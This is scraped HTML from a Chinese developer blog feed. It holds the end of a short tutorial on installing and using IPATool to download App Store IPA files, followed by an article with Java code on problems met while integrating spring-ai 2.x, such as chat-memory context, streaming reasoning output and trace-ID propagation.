                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>IPATool 是一款命令行工具，可通过 Apple ID 从 App Store 下载加密 IPA 包，支持多平台（macOS/Windows/Linux），适用于开发者测试、版本归档等场景。</p>
<h3 data-id="heading-0">一、安装（分平台）</h3>
<h4 data-id="heading-1">1. macOS（推荐 Homebrew）</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 安装 ipatool</span>
brew install ipatool
<span class="hljs-meta"># 验证</span>
ipatool --version
<span class="hljs-comment">// 结果 ipatool version 2.1.6</span>
</code></pre>
<ol>
<li>验证：终端输入 <code>ipatool --version</code> 显示版本号即可。</li>
</ol>
<h3 data-id="heading-2">二、核心流程：认证 → 搜索 → 下载</h3>
<h4 data-id="heading-3">1. 账号认证（必需）</h4>
<p>bash</p>
<p>运行</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 登录 Apple ID（开启双重验证需输入验证码）</span>
ipatool auth login -e 你的邮箱 -p 你的密码
<span class="hljs-comment"># 查看登录信息</span>
ipatool auth info
<span class="hljs-comment"># 登出/撤销凭证</span>
ipatool auth revoke
</code></pre>
<p><strong>注意</strong>：双重验证环境下，密码需用「App 专用密码」（Apple ID 管理页生成），避免登录失败。</p>
<h4 data-id="heading-4">2. 搜索应用（获取 Bundle ID/App ID）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 搜索关键词，限制返回 5 条结果</span>
ipatool search <span class="hljs-string">"微信"</span> --<span class="hljs-built_in">limit</span> 5
<span class="hljs-comment"># 输出示例（含 Bundle ID：com.tencent.xin）</span>
</code></pre>
<h4 data-id="heading-5">3. IPA文件下载</h4>
<p>找到目标应用后，使用应用ID进行下载：</p>
<pre><code class="hljs language-css" lang="css">ipatool download <span class="hljs-attr">--app-id</span> 应用ID <span class="hljs-attr">--output</span> 保存路径
//例 ipatool download <span class="hljs-attr">--app-id</span> <span class="hljs-number">155342910943</span> <span class="hljs-attr">--output</span> 保存路径
</code></pre>
<p>备注:
下载提示「未购买」未加 <code>--purchase</code> 参数首次下载添加 <code>--purchase</code> 获取许可</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[集成 spring-ai 2.x 实践中遇到的一些问题及解决方案]]></title>    <link>https://juejin.cn/post/7602894102993207306</link>    <guid>https://juejin.cn/post/7602894102993207306</guid>    <pubDate>2026-02-05T06:30:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602894102993207306" data-draft-id="7602893600251985966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="集成 spring-ai 2.x 实践中遇到的一些问题及解决方案"/> <meta itemprop="keywords" content="Java,人工智能"/> <meta itemprop="datePublished" content="2026-02-05T06:30:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kfyty725"/> <meta itemprop="url" content="https://juejin.cn/user/2685462482255984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            集成 spring-ai 2.x 实践中遇到的一些问题及解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2685462482255984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kfyty725
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:30:20.000Z" title="Thu Feb 05 2026 06:30:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、接入 spring-ai</h2>
<h3 data-id="heading-1">版本选择</h3>
<p>本来选择的 1.1.2 版本，完成基础集成后，查看 github 仓库，发现后续仅基于 2.x 开发，而 2.x 基于 springboot4.x + jdk 21，于是直接升级到了 2.0.0-M1，核心 maven 依赖如下：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-mcp-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-mcp-server-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-mcp-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">二、遇到的一些集成问题</h3>
<h4 data-id="heading-3">1、保存聊天记忆时如何获取请求上下文？</h4>
<p>如下代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.openapiChatClient.prompt()
        .user(input)
        .advisors(a -&gt; a.param(<span class="hljs-string">"key1"</span>, <span class="hljs-string">"value1"</span>))
        .stream()
        .content();
</code></pre>
<p>那么这段代码在 ChatMemoryRepository#saveAll 方法执行时，是无法获取到设置的 key1=value1 的上下文的。如果想要根据一些参数做特定业务或者扩展，就无法实现。怎么解决呢？<br/>
自定义一个 DecorateMessageChatMemoryAdvisor 即可，装饰下 MessageChatMemoryAdvisor。<br/>
在 MessageChatMemoryAdvisor#before 和 MessageChatMemoryAdvisor#after 方法中，将请求上下文设置到 ThreadLocal 中，这样后续就可以拿到上下文了。<br/>
如何配置呢？</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ChatClient <span class="hljs-title function_">openapiChatClient</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier("openaiChatClientBuilder")</span> ChatClient.Builder chatClientBuilder,
                                        ChatMemory chatMemory,
                                        ToolCallbackProvider[] mcpServerTools)</span> {
        <span class="hljs-keyword">return</span> chatClientBuilder
                .defaultAdvisors(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DecorateMessageChatMemoryAdvisor</span>(chatMemory))
                .defaultToolCallbacks(mcpServerTools)
                .build();
    }

</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorateMessageChatMemoryAdvisor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseChatMemoryAdvisor</span> {
    <span class="hljs-comment">/**
     * 聊天记忆
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatMemory chatMemory;

    <span class="hljs-comment">/**
     * 装饰目标
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MessageChatMemoryAdvisor advisor;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DecorateMessageChatMemoryAdvisor</span><span class="hljs-params">(ChatMemory chatMemory)</span> {
        <span class="hljs-built_in">this</span>.chatMemory = chatMemory;
        <span class="hljs-built_in">this</span>.advisor = MessageChatMemoryAdvisor.builder(chatMemory)
                .conversationId(Constant.DEFAULT_CONVERSATION_ID)
                .scheduler(Schedulers.fromExecutorService(DecorateExecutorService.decorateTrace(Executors.newThreadPerTaskExecutor(Thread.ofVirtual().name(<span class="hljs-string">"vchat-memory"</span>).factory()))))
                .build();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.getName();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Scheduler <span class="hljs-title function_">getScheduler</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.getScheduler();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConversationId</span><span class="hljs-params">(Map&lt;String, Object&gt; context, String defaultConversationId)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.getConversationId(context, defaultConversationId);
    }

    <span class="hljs-comment">/**
     * 这里要复制重写，否则 this 就不对了
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">adviseStream</span><span class="hljs-params">(ChatClientRequest chatClientRequest, StreamAdvisorChain streamAdvisorChain)</span> {
        <span class="hljs-comment">// trace_id</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> MDC.get(Constant.TRACE_ID);

        <span class="hljs-comment">// Get the scheduler from BaseAdvisor</span>
        <span class="hljs-type">Scheduler</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getScheduler();

        <span class="hljs-comment">// Process the request with the before method</span>
        <span class="hljs-keyword">return</span> Mono.just(chatClientRequest)
                .publishOn(scheduler)
                .map(request -&gt; <span class="hljs-built_in">this</span>.before(request, streamAdvisorChain))
                .flatMapMany(streamAdvisorChain::nextStream)
                .transform(flux -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecorateChatClientMessageAggregator</span>(traceId, chatClientRequest).aggregateChatClientResponse(flux, response -&gt; <span class="hljs-built_in">this</span>.after(response, streamAdvisorChain)));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ChatClientRequest <span class="hljs-title function_">before</span><span class="hljs-params">(ChatClientRequest chatClientRequest, AdvisorChain advisorChain)</span> {
        Map&lt;String, Object&gt; context = chatClientRequest.context();
        context.put(ChatMemoryConfig.CHAT_TYPE, MessageType.USER);
        Map&lt;String, Object&gt; prev = ChatMemoryConfig.setChatContext(context);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// spring-ai 不存在系统提示词，这里手动保存</span>
            <span class="hljs-type">SystemMessage</span> <span class="hljs-variable">systemMessage</span> <span class="hljs-operator">=</span> chatClientRequest.prompt().getSystemMessage();
            <span class="hljs-built_in">this</span>.chatMemory.add(<span class="hljs-built_in">this</span>.getConversationId(chatClientRequest.context(), Constant.DEFAULT_CONVERSATION_ID), systemMessage);

            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.before(chatClientRequest, advisorChain);
        } <span class="hljs-keyword">finally</span> {
            ChatMemoryConfig.setChatContext(prev);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ChatClientResponse <span class="hljs-title function_">after</span><span class="hljs-params">(ChatClientResponse chatClientResponse, AdvisorChain advisorChain)</span> {
        Map&lt;String, Object&gt; context = chatClientResponse.context();
        context.put(ChatMemoryConfig.CHAT_TYPE, MessageType.ASSISTANT);
        Map&lt;String, Object&gt; prev = ChatMemoryConfig.setChatContext(context);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.after(chatClientResponse, advisorChain);
        } <span class="hljs-keyword">finally</span> {
            ChatMemoryConfig.setChatContext(prev);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.getOrder();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.hashCode();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span> {
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-built_in">this</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> DecorateMessageChatMemoryAdvisor decorate) {
            <span class="hljs-keyword">return</span> decorate.advisor.equals(<span class="hljs-built_in">this</span>.advisor);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.advisor.toString();
    }
}
</code></pre>
<h4 data-id="heading-4">2、怎么输出思考过程？</h4>
<p>spring-ai 默认不支持输出思考过程（也可能我没找到配置方式），那么怎么实现呢？
答案还是自定义 DecorateMessageChatMemoryAdvisor + 自定义 DecorateChatClientMessageAggregator。<br/>
在 DecorateMessageChatMemoryAdvisor#adviseStream 方法中，使用自定义聚合器输出思考过程即可，自定义聚合器代码如下（其中的 SSE_EMITTER_KEY 需要设置到请求的上下文中）：</p>
<pre><code class="hljs language-java" lang="java">adviseStream<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorateChatClientMessageAggregator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChatClientMessageAggregator</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String traceId;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClientRequest chatClientRequest;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">aggregateChatClientResponse</span><span class="hljs-params">(Flux&lt;ChatClientResponse&gt; chatClientResponses, Consumer&lt;ChatClientResponse&gt; aggregationHandler)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">emitterKey</span> <span class="hljs-operator">=</span> Mapping.from(chatClientRequest.context()).notNullMap(e -&gt; e.get(SSE_EMITTER_KEY)).notNullMap(e -&gt; (String) e).get();
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.aggregateChatClientResponse(chatClientResponses.doOnNext(e -&gt; sendReasoning(e, emitterKey)), aggregationHandler);
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendReasoning</span><span class="hljs-params">(ChatClientResponse response, String emitterKey)</span> {
        <span class="hljs-keyword">if</span> (response.chatResponse() == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span>;
        }
        List&lt;Generation&gt; results = response.chatResponse().getResults();
        <span class="hljs-keyword">for</span> (Generation result : results) {
            Map&lt;String, Object&gt; metadata = result.getOutput().getMetadata();
            <span class="hljs-type">String</span> <span class="hljs-variable">reasoningContent</span> <span class="hljs-operator">=</span> (String) metadata.get(<span class="hljs-string">"reasoningContent"</span>);
            <span class="hljs-keyword">if</span> (reasoningContent != <span class="hljs-literal">null</span> &amp;&amp; !reasoningContent.isBlank()) {
                <span class="hljs-keyword">if</span> (emitterKey == <span class="hljs-literal">null</span>) {
                    Logs.runOnTraceId(traceId, () -&gt; log.info(<span class="hljs-string">"reasoning: {}"</span>, reasoningContent));
                    <span class="hljs-keyword">continue</span>;
                }
                Emitters.sendSseEvent(emitterKey, Constant.SseEvent.REASONING_CONTENT, reasoningContent);
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-5">3、流式响应时怎么传递 MDC 的 trace_id？</h4>
<p>spring-ai 使用响应式的 WebClient 发起 ai 会话请求，因此想要在日志中打印 trace_id 需要一些特别的配置<br/>
解决方案还是自定义 DecorateMessageChatMemoryAdvisor，在 DecorateMessageChatMemoryAdvisor#getScheduler 方法中返回自定义的调度器，然后该自定义调度器配置一个任务包装器即可。</p>
<h4 data-id="heading-6">4、本地工具调用时怎么传递 MDC 的 trace_id？</h4>
<p>所谓本地工具调用，也即工具是定义在 mcp-client 里的，无需远程调用 mcp-server 的工具，这种情况下比较简单，将 trace_id 放入 ToolContext 即可：</p>
<pre><code class="hljs language-java" lang="java">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.openapiChatClient.prompt()
                .user(input)
                .toolContext(Map.of(<span class="hljs-string">"traceId"</span>, MDC.get(<span class="hljs-string">"traceId"</span>)))
                .stream()
                .content();
</code></pre>
<p>然后编写一个 McpTools 工具：</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">runOnToolContext</span><span class="hljs-params">(Map&lt;String, Object&gt; context, Supplier&lt;T&gt; supplier)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> (String) context.get(Constant.TRACE_ID);

        <span class="hljs-keyword">if</span> (traceId == <span class="hljs-literal">null</span>) {
            <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> supplier.get();
            log.info(<span class="hljs-string">"工具调用完成: {}"</span>, result);
            <span class="hljs-keyword">return</span> result;
        }

        <span class="hljs-keyword">return</span> runOnTraceId(traceId, supplier, result -&gt; log.info(<span class="hljs-string">"工具调用完成: {}"</span>, result));
    }
	
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">runOnTraceId</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String traceId, <span class="hljs-keyword">final</span> Supplier&lt;T&gt; supplier, <span class="hljs-keyword">final</span> Consumer&lt;T&gt; consumer)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">prev</span> <span class="hljs-operator">=</span> MDC.get(Constant.TRACE_ID);
        <span class="hljs-keyword">try</span> {
            MDC.put(Constant.TRACE_ID, traceId);
            <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> supplier.get();
            <span class="hljs-keyword">if</span> (consumer != <span class="hljs-literal">null</span>) {
                consumer.accept(result);
            }
            <span class="hljs-keyword">return</span> result;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (prev == <span class="hljs-literal">null</span>) {
                MDC.remove(Constant.TRACE_ID);
            } <span class="hljs-keyword">else</span> {
                MDC.put(Constant.TRACE_ID, prev);
            }
        }
    }
</code></pre>
